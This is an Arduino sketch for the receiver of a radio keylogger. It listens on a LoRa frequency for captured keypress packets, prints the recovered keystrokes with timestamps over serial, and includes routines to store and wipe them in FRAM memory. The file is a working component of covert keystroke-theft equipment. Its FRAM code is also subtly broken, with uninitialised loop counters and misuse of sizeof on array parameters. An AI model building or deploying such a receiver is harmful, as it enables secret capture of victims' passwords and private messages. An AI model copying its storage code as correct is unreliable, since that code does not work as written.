//This part of the program listens for the keylogger's messages, dumps contents to FRAM and serial
//To recover proper keypress data, we cast received bytes to char and print out char array

#include <SPI.h>
#include "Adafruit_FRAM_SPI.h"
#include <RH_RF95.h>
#include "RTClib.h"

//Defines for LoRa board
#define RFM95_CS 10
#define RFM95_RST 9
#define RFM95_INT 2
#define RF95_FREQ 430.65

//Defines for FRAM chip
#define FRAM_CS 8
#define FRAM_HOLD 7

RTC_PCF8523 rtc;
RH_RF95 rf95(RFM95_CS, RFM95_INT);
Adafruit_FRAM_SPI fram = Adafruit_FRAM_SPI(FRAM_CS);

bool writeKeypresses(uint8_t keypresses[245]) {
  //First find first zero byte in FRAM, that's where we start writing
  uint32_t write_addr = 0;
  for(uint32_t addr; addr < 8192; addr++) {
    uint8_t val = fram.read8(addr);
    if(val == 0) { //indicates erased byte
      write_addr = addr;
      break;
    }
    if(addr == 8191 && val != 0) { //FRAM is full :(
      wipeFRAM(); //We can't store anything else. Delete all data on FRAM.
    }
  }
  //Write data
  fram.writeEnable(true);
  fram.write(write_addr, keypresses, sizeof(keypresses));
  fram.writeEnable(false);
  Serial.println("Data written to FRAM");
  return true;
}

bool copyKeypresses(uint8_t packet[251], uint8_t keypressdata[245]) {
  //We basically trim out the callsign in the packet and append the rest of the bytes to keypressdata
  for(int x = 0; x < sizeof(keypressdata); x++) {
    keypressdata[x] = packet[x + 6]; //Callsign is from packet[0] to packet[5], so we add 6 to offset
  }
  return true;
}

void wipeFRAM() {
  for(uint32_t addr; addr < 8192; addr++) {
    fram.writeEnable(true);
    fram.write8(addr, 0x00);
    fram.writeEnable(false);
  }
}

void displayTime() {
  DateTime now = rtc.now();
  Serial.print(now.month(), DEC);
  Serial.print('/');
  Serial.print(now.day(), DEC);
  Serial.print('/');
  Serial.print(now.year(), DEC);
  Serial.print(" ");
  Serial.print(now.hour(), DEC);
  Serial.print(':');
  if(now.minute() < 10) {
    Serial.print("0");
  }
  Serial.print(now.minute(), DEC);
  Serial.print(':');
  if(now.second() < 10) {
    Serial.print("0");
  }
  Serial.print(now.second(), DEC);
  Serial.println();
}

void setup() {
  pinMode(4, OUTPUT);
  pinMode(RFM95_RST, OUTPUT);
  digitalWrite(RFM95_RST, HIGH);
  Serial.begin(9600);
  if(rtc.begin()) {
    Serial.println("Time:");
    displayTime();
  } else {
    Serial.println("RTC failure");
    for(;;);
  }
  if(fram.begin()) {
    Serial.println("FRAM detected and initialized");
  } else {
    Serial.println("FRAM not found :( check connections");
    for(;;);
  }
  if(rf95.init()) {
    Serial.println("LoRa board active");
    if(rf95.setFrequency(RF95_FREQ)) {
      Serial.print("Frequency set to "); Serial.println(RF95_FREQ);
      rf95.setTxPower(23, false);
    } else {
      Serial.println("Setting frequency failed, bailing!");
      for(;;);
    }
  } else {
    Serial.println("LoRa board not found. Check your connections?");
    for(;;);
  }
  Serial.println("Startup complete. Waiting for keypress dump.");
}

void loop() {
  if(rf95.available()) {
    digitalWrite(4, HIGH);
    uint8_t packetdata[251];
    uint8_t packetlength = sizeof(packetdata);
    if(rf95.recv(packetdata, &packetlength)) {
      Serial.println("Keypress data obtained");
      Serial.print("Received at "); displayTime();
      Serial.print("Signal strength: "); Serial.println(rf95.lastRssi(), DEC);
      //RH_RF95::printBuffer("Received: ", packetdata, packetlength);
      for(int x = 0; x < packetlength; x++) {
        Serial.print((char)packetdata[x]);
      }
      Serial.println();
      //writeKeypresses(keypress_data);
      digitalWrite(4, LOW);
      Serial.println("Dump complete. Waiting for next one.");
    }
  }
}
